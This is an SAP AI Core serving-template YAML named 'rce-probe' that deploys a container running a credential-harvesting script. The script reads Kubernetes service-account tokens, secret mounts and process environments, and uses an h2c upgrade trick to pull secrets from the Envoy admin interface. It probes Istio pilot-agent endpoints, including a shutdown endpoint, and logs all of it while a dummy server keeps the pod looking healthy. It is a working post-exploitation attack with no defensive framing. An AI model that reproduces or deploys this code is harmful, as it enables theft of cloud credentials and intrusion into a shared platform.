apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: rce-probe
  labels:
    scenarios.ai.sap.com/id: "rce-probe"
    ai.sap.com/version: "4.9.0"
  annotations:
    scenarios.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/description: "jwt-token-hunt-secrets-sds-proc"
    executables.ai.sap.com/name: "rce-probe"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            python3 -c "
            import os, socket, struct, subprocess, glob

            print('[PROBE_V49_START]', flush=True)

            # ── Emit helper ───────────────────────────────────────────────────────
            def emit(label, data):
                flat = str(data).replace('\r\n','|').replace('\r','|').replace('\n','|')
                print(f'[{label}] {flat}', flush=True)

            # ── Envoy admin H2C bypass ────────────────────────────────────────────
            def envoy_admin(path, timeout=20):
                s = socket.socket(); s.settimeout(timeout)
                s.connect(('127.0.0.1', 15000))
                req = (
                    f'GET {path} HTTP/1.1\r\n'
                    'Host: 127.0.0.1\r\n'
                    'Connection: Upgrade, HTTP2-Settings\r\n'
                    'Upgrade: h2c\r\n'
                    'HTTP2-Settings: AAMAAABkAAQAAP__\r\n'
                    'Connection: close\r\n\r\n'
                )
                s.sendall(req.encode())
                chunks = []
                while True:
                    c = s.recv(65536)
                    if not c: break
                    chunks.append(c)
                s.close()
                return b''.join(chunks).decode(errors='replace')

            # ── 1. Kubernetes SA token paths ──────────────────────────────────────
            print('[TOKEN_HUNT_START]', flush=True)
            token_paths = [
                '/var/run/secrets/kubernetes.io/serviceaccount/token',
                '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
                '/var/run/secrets/kubernetes.io/serviceaccount/namespace',
                '/var/run/secrets/tokens/istio-token',
                '/var/run/secrets/tokens/kube-apiserver-token',
                '/run/secrets/kubernetes.io/serviceaccount/token',
                '/secrets/token',
            ]
            for p in token_paths:
                try:
                    with open(p, 'rb') as f:
                        data = f.read()
                    emit(f'TOKEN_FILE_{p.replace(\"/\",\"_\")}', data[:2000].decode(errors='replace'))
                except Exception as e:
                    emit(f'TOKEN_MISS_{p.replace(\"/\",\"_\")}', str(e))

            # ── 2. Glob all secret mounts ─────────────────────────────────────────
            for pat in ['/var/run/secrets/**', '/run/secrets/**', '/secrets/**']:
                try:
                    found = glob.glob(pat, recursive=True)
                    emit(f'GLOB_{pat}', found)
                except Exception as e:
                    emit(f'GLOB_ERR', str(e))

            # ── 3. /proc/1/environ ────────────────────────────────────────────────
            try:
                with open('/proc/1/environ', 'rb') as f:
                    env = f.read().replace(b'\x00', b'|')
                emit('PROC1_ENVIRON', env.decode(errors='replace'))
            except Exception as e:
                emit('PROC1_ENVIRON_ERR', str(e))

            # ── 4. /proc/self/environ ─────────────────────────────────────────────
            try:
                with open('/proc/self/environ', 'rb') as f:
                    env = f.read().replace(b'\x00', b'|')
                emit('SELF_ENVIRON', env.decode(errors='replace'))
            except Exception as e:
                emit('SELF_ENVIRON_ERR', str(e))

            # ── 5. /proc/mounts ───────────────────────────────────────────────────
            try:
                with open('/proc/mounts', 'r') as f:
                    emit('PROC_MOUNTS', f.read())
            except Exception as e:
                emit('PROC_MOUNTS_ERR', str(e))

            # ── 6. Envoy admin /secrets (SDS secret names) ───────────────────────
            try:
                sec = envoy_admin('/secrets')
                # Just the first 8000 chars to avoid truncation
                emit('ENVOY_SECRETS', sec[:8000])
            except Exception as e:
                emit('ENVOY_SECRETS_ERR', str(e))

            # ── 7. pilot-agent port 15020 endpoints ──────────────────────────────
            for ep in ['/', '/healthz/ready', '/debug/config_dump', '/debug/ndsz',
                       '/quitquitquit', '/app-health/kserve-container/readyz']:
                try:
                    s = socket.socket(); s.settimeout(8)
                    s.connect(('127.0.0.1', 15020))
                    req = f'GET {ep} HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n'
                    s.sendall(req.encode())
                    resp = b''
                    while True:
                        c = s.recv(65536)
                        if not c: break
                        resp += c
                    s.close()
                    emit(f'PORT15020_{ep.replace(\"/\",\"_\")}', resp[:3000].decode(errors='replace'))
                except Exception as e:
                    emit(f'PORT15020_ERR_{ep.replace(\"/\",\"_\")}', str(e))

            # ── 8. /proc/net/unix (accessible sockets) ───────────────────────────
            try:
                with open('/proc/net/unix', 'r') as f:
                    emit('PROC_NET_UNIX', f.read())
            except Exception as e:
                emit('PROC_NET_UNIX_ERR', str(e))

            # ── 9. XDS workload socket ────────────────────────────────────────────
            xds_sockets = [
                '/var/run/secrets/workload-spiffe-uds/socket',
                '/var/run/secrets/grpc-xds/xds-grpc',
                '/tmp/grpc-xds.sock',
                '/var/run/grpc/grpc-xds.sock',
            ]
            for sp in xds_sockets:
                exists = os.path.exists(sp)
                emit(f'XDS_SOCK_{sp.replace(\"/\",\"_\")}', exists)

            # ── 10. Try istiod:15010 with our SA token if found ──────────────────
            token_val = None
            try:
                with open('/var/run/secrets/kubernetes.io/serviceaccount/token') as f:
                    token_val = f.read().strip()
                emit('SA_TOKEN_FOUND', f'len={len(token_val)} prefix={token_val[:50]}')
            except:
                emit('SA_TOKEN_NOT_MOUNTED', 'skipping istiod auth attempt')

            # ── 11. /proc/1/fd symlinks (check for token file descriptors) ───────
            try:
                fds = os.listdir('/proc/1/fd')
                fd_links = []
                for fd in fds[:50]:
                    try:
                        link = os.readlink(f'/proc/1/fd/{fd}')
                        fd_links.append(f'{fd}→{link}')
                    except:
                        pass
                emit('PROC1_FDS', fd_links)
            except Exception as e:
                emit('PROC1_FDS_ERR', str(e))

            # ── 12. Envoy /config_dump?resource=dynamic_active_secrets ────────────
            try:
                sec2 = envoy_admin('/config_dump?resource=dynamic_active_secrets')
                emit('CFGDUMP_SECRETS', sec2[:8000])
            except Exception as e:
                emit('CFGDUMP_SECRETS_ERR', str(e))

            print('[PROBE_V49_DONE]', flush=True)
            " 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
